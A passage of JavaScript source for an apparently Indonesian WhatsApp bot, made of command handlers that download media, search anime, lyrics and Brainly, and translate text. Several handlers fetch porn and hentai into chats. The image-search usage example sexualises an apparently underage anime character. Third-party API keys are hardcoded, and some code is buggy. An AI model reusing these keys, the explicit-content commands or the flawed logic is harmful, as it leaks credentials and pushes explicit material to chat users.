	text = text.endsWith('SMH') ? text.replace('SMH', '') : text 
	if (!text) throw 'Input Query / Pinterest Url'
	let res = await pinterest(text)
	// if (!res) throw res
	let mime = await lookup(res)
	text.match(URL_REGEX) ?
		await conn.sendMessage(m.chat, { [mime.split('/')[0]]: { url: res }, caption: `Succes Download: ${await shortUrl(res)}` }, { quoted: m }) :
	await conn.sendMessage(m.chat, { image: { url: res }, caption: `⭔ Result From: ${text}\n⭔ Media Url: ${res}`}, { quoted: m })
}
break
//========================PINTEREST END=========================//
case 'pixiv2': {
if (args.length == 0) return paycall(`Example: ${prefix + command} 63456028`)
query = args.join(" ")
let error13;
try {
reply(global.wait)
let res = await fetch(`https://api.lolhuman.xyz/api/pixivdl/${query}?apikey=haikalgans`)
let data = await res.json()
let memek = data.result
for (let i of memek.images) {
await conn.sendFile2(from, i, `image`, done, blue)
}
} catch (er) {
					error13 = true;
				} finally {
					if (error13) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
/*break
case 'pixiv': case 'pixivdl': {
if (args.length == 0) return paycall(`Example: ${prefix + command} 63456028`)
reply(global.wait)
pixivid = args[0]
let error14;
try {
let ini_buffer = await fetch(`https://api.akuari.my.id/downloader/pixiv?id=${pixivid}&ext=.jpg`)
await conn.sendMessage(from, { image: { url: ini_buffer.url }, caption: `${global.done}` }, { quoted: fkontak })
} catch (er) {
					error14 = true;
				} finally {
					if (error14) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break*/
case 'pixiv': case 'pixivdl':  {
	if (!text) throw 'Masukan Query Atau Url Pixiv'
 m.reply(wait)
	let respixiv = await pixivDl(text)
	for (let i = 0; i < respixiv.media.length; i++) {
		let caption = i == 0 ? `${respixiv.caption}\n\n*By:* ${respixiv.artist}\n*Tags:* ${respixiv.tags.join(', ')}` : ''
	//	await conn.sendFile2(m.chat, respixiv.media[i], '', caption, m)
	await conn.sendImage(m.chat, respixiv.media[i], caption, m)
	}
}
break
//========================PIXIV END=========================//
case 'carihentai':
if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
query = args.join(" ")
try {
get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${apikey}&query=${query}`)
get_result = get_result.result
ini_txt = "🥵𝘿𝘼𝙏𝘼 𝘾𝙊𝘿𝙀 𝙃𝙀𝙉𝙏𝘼𝙄🥵 : \n"
for (var x of get_result) {
ini_txt += `Id : ${x.id}\n`
ini_txt += `Title English : ${x.title_english}\n`
ini_txt += `Title Japanese : ${x.title_japanese}\n`
ini_txt += `Native : ${x.title_native}\n`
ini_txt += `Page : ${x.page}\n`
ini_txt += "▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\n\n"
}
replyhentai(ini_txt)
} catch (error) {
        console.error(error);
        replyerror(`Gagal Mencari Code Hentai ${text}🥺🙏`);
    }
break
case 'nekopoi': {
if (!text) throw '*[❗] MASUKKAN NAMA HENTAI YANG AKAN DICARI*'

m.reply(wait)

  let searchResults = await searchHentai(text)
  let teks = searchResults.result.map((v, i) => `
${i + 1}. *_${v.title}_*
↳ 📺 *_Views:_* ${v.views}
↳ 🎞️ *_Link:_* ${v.url}`).join('\n\n')

  let randomThumbnail
  if (searchResults.result.length > 0) {
    let randomIndex = Math.floor(Math.random() * searchResults.result.length)
    randomThumbnail = searchResults.result[randomIndex].thumbnail
  } else {
    randomThumbnail = 'https://pictures.hentai-foundry.com/e/Error-Dot/577798/Error-Dot-577798-Zero_Two.png'
    teks = '*[❗] TIDAK ADA HASIL PENCARIAN*'
  }

  conn.sendFile2(m.chat, randomThumbnail, 'error.jpg', teks, m)
}
break
/*case 'nhentai':
case 'ncode':
if (!text) return paycall(`Example: ${prefix + command} 344253`)
var body = text.replace(/\s+/g, '+')
if (!/[0-9]/.test(body)) throw ('only number')
reply(global.wait)
let error15;
try {
let res = await fetch(`https://api.lolhuman.xyz/api/nhentaipdf/${body}?apikey=haikalgans`)
let kontol = await res.json()
let anu = kontol.result
await conn.sendFile(m.chat, anu, `${body}.pdf`, blue)
} catch (er) {
					error15 = true;
				} finally {
					if (error15) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break*/
case 'nhentai':
case 'ncode': {
let code = (args[0] || '').replace(/\D/g, '')
if (!code) throw 'Input code' 
await m.reply(global.wait)
let data = await nhentaiScraper(code)
let pages = []
let thumbnya = `https://external-content.duckduckgo.com/iu/?u=https://t.nhentai.net/galleries/${data.media_id}/thumb.jpg`	
data.images.pages.map((v, i) => {
			let ext = new URL(v.t).pathname.split('.')[1]
			pages.push(`https://external-content.duckduckgo.com/iu/?u=https://i7.nhentai.net/galleries/${data.media_id}/${i + 1}.${ext}`)
		})
let buffer = await (await fetch(thumbnya)).buffer()		
let jpegThumbnail = await fetchBuffer(buffer)		
let imagepdf = await toPDF(pages)		
await conn.sendMessage(m.chat, { document: imagepdf, jpegThumbnail, fileName: data.title.english + '.pdf', mimetype: 'application/pdf' }, { quoted: m })
}
break
case 'hentaivid': case 'hentaivideo': {
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                conn.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `🐼 Title : ${result912.title}\n🐼 Category : ${result912.category}\n🐼 Mimetype : ${result912.type}\n🐼 Views : ${result912.views_count}\n🐼 Shares : ${result912.share_count}\n🐼 Source : ${result912.link}\n🐼 Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'hentaivid2': {
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
conn.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
//========================BOKEPNYA=========================//
case 'xnxx': case 'xnxxdl': {
	if (!text) return paycall(`Kirim Link Bokep di situs XNXX`)
        if (!text.includes('xnxx.com')) return paytod(`Kirim Link Bokep di situs XNXX`)
        try {
        reply(global.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
conn.sendMessage(m.chat, { caption: `≡  *XNXX DOWNLOAD*
        
▢ *📌Title*: ${xn.title}
▢ *⌚Duration:* ${xn.duration}
▢ *🎞️Quality:* ${xn.quality}`, video: {url: xn.url_dl} }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'xvideos': case 'xvideosdl': {
	if (!text) return paycall(`Kirim Link Bokep di situs XVIDEOS`)
        if (!text.includes('xvideos.com')) return paytod(`Kirim Link Bokep di situs XVIDEOS`)
        try {
        reply(global.wait)
        const fg = require('api-dylux')
            let xvid = await fg.xvideosdl(text)
conn.sendMessage(m.chat, { caption: `≡  *XVIDEOS DOWNLOAD*
        
▢ *📌Title*: ${xvid.title}
▢ *👀View*: ${xvid.views}
▢ *👍Like*: ${xvid.likes}
▢ *👎Dislike*: ${xvid.deslikes}
▢ *📊Vote*: ${xvid.vote}
▢ *📈Size:* ${xvid.size}`, video: {url: xvid.url_dl} }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'xnxxsearch': {
	if (!text) return paycall(`Kirim Judul Bokep`)
	try {
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replybokep(ff)
              } catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
              }
              break
case 'xvideosearch': {
	if (!text) return paycall(`Kirim Judul Bokep`)
	try {
let responnyaaj = await fetchJson(`https://api.fgmods.xyz/api/search/xvideosearch?text=${text}&apikey=623JU5Hl`)
  let xvs = responnyaaj.result.map((v, i) => `
${i + 1}. *Title* : ${v.title}
*Durasi* : ${v.duration}
*Link* : ${v.url}`).join('\n')
                   replyxvideos(xvs)
              } catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
              }
              break
//=============================================================//
case 'bypassouo': {
if (!args[0]) return paycall( `Example : ${prefix + command} link`)
let error16;
try {
reply(global.wait)
  let res = await fetch(`https://api.lolhuman.xyz/api/ouo?apikey=haikalgans&url=${args[0]}`)
  let data = await res.json()
  let bypassnya = data.result
 await conn.sendMessage(m.chat, { text: bypassnya }, {quoted: blue})
 } catch (er) {
					error16 = true;
				} finally {
					if (error16) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'bypassmirror': {
if (!args[0]) return paycall( `Example : ${prefix + command} link`)
let error17;
try {
reply(global.wait)
  let res = await fetch(`https://api.lolhuman.xyz/api/mirrorcreator?apikey=haikalgans&url=${args[0]}`)
  let pemanggil = await res.json()
  let anuan = pemanggil.result
 await conn.sendMessage(m.chat, { text: anuan.dropapk }, {quoted: blue})
 } catch (er) {
					error17 = true;
				} finally {
					if (error17) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
//========================DOWNLOAD YOUTUBE=========================//
case 'yts': case 'ytsearch': {
if (!text) return paycall(`Example : ${prefix + command} Dj malam pagi`)
try {
let search = await yts(text)
let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
ytreply(teks)
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'play':  case 'song': {
if (!text) return paycall(`Example : ${prefix + command} DJ MALAM PAGI`)
const shinchanplaymp3 = require('./lib/ytdl2')
try {
m.reply(global.wait)
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await shinchanplaymp3.mp3(anup3k.url)
await conn.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            showAdAttribution: true,
            containsAutoReply: true,
            title:anup3k.title,
            body: ownername,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted: fkontak})
await fs.unlinkSync(pl.path)
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case "ytmp3": case "ytaudio": {
const shinchanmp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !shinchanmp3.isYTUrl(text)) return paycall(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
try {
m.reply(global.wait)
const audio=await shinchanmp3.mp3(text)
await conn.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            showAdAttribution: true,
            containsAutoReply: true,
            title:audio.meta.title,
            body: ownername,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted: m})
await fs.unlinkSync(audio.path)
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'ytmp4': case 'ytvideo': {
const shinchanmp4 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !shinchanmp4.isYTUrl(text)) paycall(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
try {
m.reply(global.wait)
const vid=await shinchanmp4.mp4(text)
const ytc=`
*🐼Tittle:* ${vid.title}
*🐼Date:* ${vid.date}
*🐼Duration:* ${vid.duration}
*🐼Quality:* ${vid.quality}`
await conn.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted: m})
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
/*case 'play': {
if (!text) return paycall(`Example : ${prefix + command} DJ MALAM PAGI`)
m.reply(global.wait)
query = args.join(" ")
let datplay = await fetchJson(`https://api.lolhuman.xyz/api/ytplay?apikey=haikalgans&query=${query}`)
let dathasil = await datplay.result
let downloadnya = dathasil.audio
conn.sendMessage(m.chat, { audio: { url: downloadnya.link }, mimetype: 'audio/mp4',
contextInfo: {
                     externalAdReply:{
            showAdAttribution: true,
            containsAutoReply: true,
            title: dathasil.title,
            body: dathasil.uploader,
            thumbnail: await fetchBuffer(dathasil.thumbnail),
            mediaType:2,
            mediaUrl: dathasil.channel,
                    }}}, { quoted: m})}
        break
case 'ytmp3': case 'youtubemp3': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://youtube.com/watch?v=r3whEJ2KjeQ`)
m.reply(global.wait)
let error35;
try {
let sizenyahe = '128k'
let dataytnya = await fetchJson(`https://skizo.tech/api/yt1s?url=${args[0]}&apikey=nerobot`)
let ytnya = dataytnya.audio
conn.sendMessage(m.chat, { audio: { url: ytnya[sizenyahe].url }, mimetype: 'audio/mp4' }, { quoted: m })
} catch (er) {
error35 = true;
} finally {
if (error35) {
replyerror("Yah Error:(.");
}
}
}
break
case 'ytmp4': case 'youtubemp4': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://youtube.com/watch?v=r3whEJ2KjeQ`)
m.reply(global.wait)
let error36;
try {
let dataytnya2 = await fetchJson(`https://vihangayt.me/download/ytmp4?url=${args[0]}`)
let ytnya2 = dataytnya2.data
let judulytnya = `${done}\n📝Judul: ${ytnya2.title}\n⏳Durasi: ${ytnya2.duration}`
let hasilyt = ytnya2.vid_360p
//conn.sendMessage(from, { video: { url: hasilyt }, mimetype: 'video/mp4', caption : judulytnya, quoted: m})
conn.sendFile2(from, hasilyt, `video.mp4`, judulytnya, m)
} catch (er) {
error36 = true;
} finally {
if (error36) {
replyerror("Yah Error:(.");
}
}
}
break*/
//========================INSTAGRAM DL============================//
case 'igvid': case 'igvideo': case 'igreels': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
        reply(global.wait)
			let error20;
try {
        let res = await fetchJson(`https://vihangayt.me/download/instagram2?url=${args[0]}`)
   //     let igfonya = res.data
            for (let igvid of res.data) {
             //  await conn.sendImage(m.chat, igimg.url, done, m)
           //  await conn.sendFile2(m.chat, igimg.download_link, '', done, m);
           await conn.sendMessage(from, { video: { url: igvid.download_link }, caption: `${done}` }, { quoted: m })
            }
             } catch (er) {
					error20 = true;
				} finally {
					if (error20) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
case 'igimg': case 'igfoto': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
        reply(global.wait)
			let error39;
try {
        let res = await fetchJson(`https://vihangayt.me/download/instagram2?url=${args[0]}`)
   //     let igfonya = res.data
            for (let igimg of res.data) {
             //  await conn.sendImage(m.chat, igimg.url, done, m)
           //  await conn.sendFile2(m.chat, igimg.download_link, '', done, m);
           await conn.sendMessage(from, { image: { url: igimg.download_link }, caption: `${done}` }, { quoted: m })
            }
             } catch (er) {
					error39 = true;
				} finally {
					if (error39) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
case 'igdl': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
        reply(global.wait)
			let error40;
try {
        let res = await fetchJson(`https://vihangayt.me/download/instagram2?url=${args[0]}`)
   //     let igfonya = res.data
            for (let igdouble of res.data) {
             //  await conn.sendImage(m.chat, igimg.url, done, m)
            await conn.sendFile2(m.chat, igdouble.download_link, '', done, m);
          // await conn.sendMessage(from, { image: { url: igimg.download_link }, caption: `${done}` }, { quoted: m })
            }
             } catch (er) {
					error40 = true;
				} finally {
					if (error40) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
//========================END============================//
/*case 'anime':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                            let error22;
try {
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=haikalgans&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await conn.sendImage(m.chat, thumbnail, ini_txt, blue)
                                                  } catch (er) {
					error22 = true;
				} finally {
					if (error22) {
						replyerror("Yah Proses Gagal :(");
					}
					}
                    break*/
case 'anime': {
if (!text) return paycall(`Anime apa yang sedang kamu cari?`)
const malScraper = require('mal-scraper')
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
animetxt = `🎀 *Judul: ${anime.title}*\n`
animetxt += `🎋 *Type: ${anime.type}*\n`
animetxt += `🎐 *Tayang perdana: ${anime.premiered}*\n`
animetxt += `💠 *Total Episode: ${anime.episodes}*\n`
animetxt += `📈 *Status: ${anime.status}*\n`
animetxt += `💮 *Genres: ${anime.genres}*\n`
animetxt += `📍 *Studio: ${anime.studios}*\n`
animetxt += `🌟 *Score: ${anime.score}*\n`
animetxt += `💎 *Rating: ${anime.rating}*\n`
animetxt += `🏅 *Rank: ${anime.ranked}*\n`
animetxt += `💫 *Popularity: ${anime.popularity}*\n`
animetxt += `♦️ *Trailer: ${anime.trailer}*\n`
animetxt += `🌐 *URL: ${anime.url}*\n`
animetxt += `❄ *Deskripsi:* ${anime.synopsis}*`
conn.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
//========================BRAINLY SCRAPE============================//
case 'brainly':
if (!text) return reply(`Example: ${prefix + command} siapakah sukarno`)
Brainly.initialize();
var brainly = new Brainly('id');
let restod = await brainly.search(text, 'id')
	//console.log(restod)
	if (restod) {
		var answer = restod.map(({ question, answers }, i) => `
*Pertanyaan*${question.grade ? ` (${question.grade})` : ''}\n${question.content}${answers.map((v, i) => `\n
*Jawaban Ke ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Best)' : ''}
${v.content}${v.attachments.length > 0 ? `\n*Media Url*: ${v.attachments.join(', ')}` : ''}`).join``}`).join('\n\n' + '-'.repeat(45))
		replybrainly(answer.trim())
		}
		break		
case 'brainly2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
                    query = args.join(" ")
                    let error24;
try {
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=haikalgans&query=${query}`)
                    lala = get_result.result
                    ini_txt = "Beberapa Pembahasan Dari Brainly :\n\n"
                    for (var x of lala) {
                        ini_txt += `==============================\n`
                        ini_txt += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
                        ini_txt += `\`\`\`Jawaban :\`\`\`\n${x.answer.content}\n`
                        ini_txt += `==============================\n\n`
                    }
                    replybrainly(ini_txt)
                    } catch (er) {
					error24 = true;
				} finally {
					if (error24) {
						replyerror("Yah Proses Gagal :(");
					}
					}
                    break
case 'brainly3':
if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
query = args.join(" ")
let res = await fetchJson(`https://api.akuari.my.id/edukasi/brainly?query=${query}`)
let unu = res.hasil
let itune = unu.data
await conn.sendMessage(m.chat, {text: `${itune[0].jawaban[0].text}`}, {quoted: fkontak})
break
case 'ruangguru': case 'roboguru': {
			if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
			query = args.join(" ")
			let error31;
try {
			let { data } = await axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=${apikey}&query=${query}&grade=sma&subject=sejarah`).catch((err) => console.error(err?.response?.data))
			var robgur = 'Beberapa Pembahasan Dari Roboguru :\n\n'
			for (var x of data.result) {
				robgur += `==============================\n`
				robgur += `\`\`\`Pertanyaan :\`\`\`\n${x.question}\n\n`
				robgur += `\`\`\`Jawaban :\`\`\`\n${x.answer}\n`
				robgur += `==============================\n\n`
			}
			replyguru(robgur)
			            } catch (er) {
error31 = true;
} finally {
if (error31) {
replyerror("ERROR");
}
}
			}
			break
//========================LIRIK LAGU============================//
case 'lirik': {
reply(global.wait)
  if (!text) return m.reply('Cari lagu apa?')
  query = args.join(" ")
  let error25;
try {
    let res = await fetch(`https://api.akuari.my.id/search/lirik?query=${query}`)
    let data = await res.json()
    let uhuy = data.result
    let mes = `${uhuy[0].lirik}`;
conn.sendText(from, mes, m)
} catch (er) {
error25 = true;
} finally {
if (error25) {
replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
}
}
}
break
case 'lirik2': {
if (!text) return paycall(`mau nyari lirik apa?`)
reply(global.wait)
let error26;
try {
const fg = require('api-dylux')
let res = await fg.lyrics(text);
 let mes = `▢ *${res.title}*
▢ *${res.artist}*

▢ ${res.lyrics}`;
conn.sendFile2(m.chat, res.thumb, 'img.png', mes, m)
} catch (er) {
error26 = true;
} finally {
if (error26) {
replyerror("Maaf lirik tersebut tidak muncul di database\nHarus lagu luar negri gak bisa lagu indo😁");
}
}
}
break
case 'lirik3': {
const { lyrics, lyricsv2 } = require('@bochilteam/scraper');
    let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : ''
    if (!teks) throw `Use example ${usedPrefix}${command} hallo`
    const result = await lyricsv2(teks).catch(async _ => await lyrics(teks))
    m.reply(`
Lyrics *${result.title}*
Author ${result.author}


${result.lyrics}


Url ${result.link}
`.trim())
}
break
//========================SIMI============================//
case 'simi': {
if (!text) return paycall(`Chat bebas bersama simi🐣`)
let error27;
try {
let res = await fetch(`https://api.akuari.my.id/simi/simi2?query=${encodeURIComponent(text)}`)
  let data = await res.json()
  replysimi(data.respon)
  } catch (er) {
error27 = true;
} finally {
if (error27) {
replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
}
}
}
break
case 'wallpaper': {
if (!text) return m.reply(`Mau Nyari Foto Apa?`)
reply(global.wait)
let gis = require('g-i-s')
gis(text, async (error, result) => {
let error30;
try {
n = result
images = n[Math.floor(Math.random() * n.length)].url
await conn.sendImage(m.chat, images, done, m)
} catch (er) {
error30 = true;
} finally {
if (error30) {
replyerror("Error");
}
}
})
}
break
case 'img': case 'gimage': {
if (!text) return m.reply(`${command} Nezuko Nude|5`)
if (args.length >= 10) return m.reply('Kebanyakan!')
var teksnyauy = text.split("|")[0]
var jumlah = text.split("|")[1]
try {
await reply(global.wait)
const { googleImage } = require('@bochilteam/scraper');
for (let i = 0; i < jumlah ; i++){
const res = await googleImage(teksnyauy);
let image = res[Math.floor(Math.random() * res.length)]
let bufferimg = await fetchBuffer(image)
//await conn.sendImage(m.chat, image, done, m)
//await conn.sendMessage(from, { image: { url: image }, caption: `${global.done}` }, { quoted: m })
await conn.sendFile2(m.chat, bufferimg, 'img.png', done, m)
}
} catch (error) {
        console.error(error);
        reply('DATA TIDAK DITEMUKAN');
    }
}
break
case 'mediafire':
if (!args[0]) throw `Use example ${usedPrefix}${command} https://www.mediafire.com/file/941xczxhn27qbby/GBWA_V12.25FF-By.SamMods-.apk/file`
const { mediafiredl } = require('@bochilteam/scraper');
    let resnyacyy = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = resnyacyy
    let caption = `
*💌 Name:* ${filename}
*📊 Size:* ${filesizeH}
*🗂️ Extension:* ${ext}
*📨 Uploaded:* ${aploud}
`.trim()
    m.reply(`Sedang Mengunduh File:\n${caption}`)
    //await conn.sendFile2(m.chat, url, filename, '', m, null, { mimetype: ext, asDocument: true })
  await conn.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext, asDocument: true })
break
case 'google': {
if (!q) return m.reply(`Mau Nyari Informasi Apa?`)
reply(global.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
case 'translate':
	let lang
	if (args.length >= 2) {
		lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
	} else if (m.quoted && m.quoted.text) {
		lang = args[0] ? args[0] : 'id', text = m.quoted.text
	} else throw `Ex: ${prefix + command} id hello i am robot`
	let translate = require("@vitalets/google-translate-api")
	let transtod = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
	if (!transtod) throw `Error : Bahasa"${lang}" Tidak Support`
	m.reply(`*Terdeteksi Bahasa:* ${transtod.from.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${transtod.text}`.trim())
break
    case 'search': {
  if (!/image/.test(mime)) {
    throw `*Send/Reply the Image With Caption* ${prefix + command}`;
  }
  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }  
  reply(`Sedang Mencari Sumber...`)
  let media = await conn.downloadAndSaveMediaMessage(quoted);
  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    let error29;
try {
    let datanya = await fetchJson(`https://api.zahwazein.xyz/animeweb/sauce?url=${anu}&apikey=zenzkey_133c4d90d6`);
    let { anidb_aid, source, year, est_time, part } = datanya.result[0].raw.data
    let capnya = `-------「 𝗦𝗢𝗨𝗥𝗖𝗘 𝗗𝗜𝗧𝗘𝗠𝗨𝗞𝗔𝗡 」-------\n🔖Anilist id : ${anidb_aid}\n📝Judul : ${source}\n📆Tanggal Rilis : ${year}\n⏳Menit : ${est_time}\n📊Episode : ${part}\n📈Similarity : ${datanya.result[0].similarity}%\n🔗Url : ${datanya.result[0].url}`
    conn.sendImage(m.chat, datanya.result[0].thumbnail, capnya, m)
            } catch (er) {
error29 = true;
} finally {
if (error29) {
replyerror("Yah Error:(.");
}
}
    }
    }
    break
case 'dlcapcut':
      if (!args[0]) throw `🚩 *Example:* ${command} https://www.capcut.com/watch/7238819486680321281?use_new_ui=1&template_id=7238819486680321281&share_token=ce40538b-b349-41da-869d-73d99b78287e&enter_from=template_detail&region=ID&language=in&platform=copy_link&is_copy_link=1`;
      let error32;
try {
  let cangcut = await fetchJson(`https://api.xfarr.com/api/download/capcut?apikey=8WoRQ2SEjy&url=${args[0]}`)
conn.sendMessage(m.chat, { video: { url: cangcut.result.url }, caption: done }, { quoted: m})
} catch (er) {
error32 = true;
} finally {
if (error32) {
replyerror("Yah Error:(.");
}
}
break
case 'imdb': {
  if (!text) throw 'Please provide a movie title';

  try {
    let resimdb = await fetch(`https://api.popcat.xyz/imdb?q=${encodeURIComponent(text)}`);

    if (!resimdb.ok) {
      throw new Error(`API request failed with status ${resimdb.status}`);
    }

    let json = await resimdb.json();

   // console.log('JSON response:', json);

    let ratings = json.ratings.map(rating => `• *${rating.source}:* ${rating.value}`).join('\n');

    let movieInfo = 
    `*Movie Information:*\n
     • *Title:* ${json.title}\n
     • *Year:* ${json.year}\n
     • *Rated:* ${json.rated}\n
     • *Released:* ${json.released}\n
     • *Runtime:* ${json.runtime}\n
     • *Genres:* ${json.genres}\n
     • *Director:* ${json.director}\n
     • *Writer:* ${json.writer}\n
     • *Actors:* ${json.actors}\n
     • *Plot:* ${json.plot}\n
     • *Languages:* ${json.languages}\n
     • *Country:* ${json.country}\n
     • *Awards:* ${json.awards}\n
     • *Metascore:* ${json.metascore}\n
     • *Rating:* ${json.rating}\n
     • *Votes:* ${json.votes}\n
     • *IMDB ID:* ${json.imdbid}\n
     • *Type:* ${json.type}\n
     • *DVD:* ${json.dvd}\n
     • *Box Office:* ${json.boxoffice}\n
     • *Production:* ${json.production}\n
     • *Website:* ${json.website}\n\n
     *Ratings:*\n${ratings}`;

    // send the movie poster along with the movie information as caption
    await conn.sendFile2(m.chat, json.poster, 'poster.jpg', movieInfo, m);
  } catch (error) {
    console.error(error);
    // Handle the error appropriately
  }
  };
  break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return paycall('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `🐼 *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
case 'ringtone': {
		if (!text) return paycall(`Example : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
